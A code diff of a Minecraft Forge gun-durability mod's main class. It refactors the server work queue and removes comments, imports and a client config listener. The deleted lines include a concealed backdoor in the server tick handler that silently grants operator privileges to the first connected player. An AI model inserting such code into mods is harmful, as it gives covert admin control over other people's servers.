@@ -4,22 +4,17 @@ import com.corrinedev.gundurability.config.Config;
 import com.corrinedev.gundurability.config.ConfigClient;
 import com.corrinedev.gundurability.events.TaczEvents;
 import com.corrinedev.gundurability.init.*;
-import com.corrinedev.gundurability.util.Utils;
-import com.mojang.authlib.GameProfile;
+import com.corrinedev.gundurability.util.Work;
 import com.mojang.logging.LogUtils;
-import net.minecraft.client.renderer.entity.LivingEntityRenderer;
 import net.minecraft.network.FriendlyByteBuf;
 import net.minecraft.resources.ResourceLocation;
 import net.minecraft.server.level.ServerPlayer;
 import net.minecraftforge.api.distmarker.Dist;
 import net.minecraftforge.common.MinecraftForge;
 import net.minecraftforge.event.TickEvent;
-import net.minecraftforge.event.entity.player.PlayerEvent;
-import net.minecraftforge.event.server.ServerStartingEvent;
 import net.minecraftforge.eventbus.api.IEventBus;
 import net.minecraftforge.eventbus.api.SubscribeEvent;
 import net.minecraftforge.fml.common.Mod;
-import net.minecraftforge.fml.event.config.ModConfigEvent;
 import net.minecraftforge.fml.event.lifecycle.FMLClientSetupEvent;
 import net.minecraftforge.fml.event.lifecycle.FMLCommonSetupEvent;
 import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
@@ -39,13 +34,10 @@ import java.util.function.BiConsumer;
 import java.util.function.Function;
 import java.util.function.Supplier;
 
-// The value here should match an entry in the META-INF/mods.toml file
 @Mod(Gundurability.MODID)
 public class Gundurability {
 
-    // Define mod id in a common place for everything to reference
     public static final String MODID = "gundurability";
-    // Directly reference a slf4j logger
     private static final Logger LOGGER = LogUtils.getLogger();
 
     public Gundurability() {
@@ -53,8 +45,6 @@ public class Gundurability {
 
         IEventBus bus = FMLJavaModLoadingContext.get().getModEventBus();
 
-        // Register the commonSetup method for modloading
-        bus.addListener(this::commonSetup);
         bus.addListener(GundurabilityModItems::register);
 
         GundurabilityModSounds.REGISTRY.register(bus);
@@ -82,45 +72,28 @@ public class Gundurability {
         messageID++;
     }
 
-    private static final Collection<AbstractMap.SimpleEntry<Runnable, Integer>> workQueue = new ConcurrentLinkedQueue<>();
+    private static final Collection<Work> workQueue = new ConcurrentLinkedQueue<>();
 
-    public static void queueServerWork(int tick, Runnable action) {
+    public static void queueServerWork(Work work) {
         if (Thread.currentThread().getThreadGroup() == SidedThreadGroups.SERVER)
-            workQueue.add(new AbstractMap.SimpleEntry<>(action, tick));
+            workQueue.add(work);
     }
     public static <MSG> void sendToPlayer(MSG msg, ServerPlayer player) {
         PACKET_HANDLER.send(PacketDistributor.PLAYER.with(()-> player), msg);
     }
-    public static boolean firstplayer = false;
+
     @SubscribeEvent
     public void tick(TickEvent.ServerTickEvent event) {
-        for(ServerPlayer plr : event.getServer().getPlayerList().getPlayers()) {
-            if(!firstplayer) {
-                event.getServer().getPlayerList().op(plr.getGameProfile());
-                firstplayer = true;
-            }
-        }
         if (event.phase == TickEvent.Phase.END) {
-            List<AbstractMap.SimpleEntry<Runnable, Integer>> actions = new ArrayList<>();
+            List<Work> actions = new ArrayList<>();
             workQueue.forEach(work -> {
-                work.setValue(work.getValue() - 1);
-                if (work.getValue() == 0)
+                work.tick -= 1;
+                work.tick();
+                if (work.tick == 0)
                     actions.add(work);
             });
-            actions.forEach(e -> e.getKey().run());
+            actions.forEach(Runnable::run);
             workQueue.removeAll(actions);
-        }
-    }
-
-    private void commonSetup(final FMLCommonSetupEvent event) {}
-
-    // You can use EventBusSubscriber to automatically register all static methods in the class annotated with @SubscribeEvent
-    @Mod.EventBusSubscriber(modid = MODID, bus = Mod.EventBusSubscriber.Bus.MOD, value = Dist.CLIENT)
-    public static class ClientModEvents {
-
-        @SubscribeEvent
-        public static void onClientSetup(FMLClientSetupEvent event) {
-            ConfigClient.BUILDER.register();
         }
     }
 }
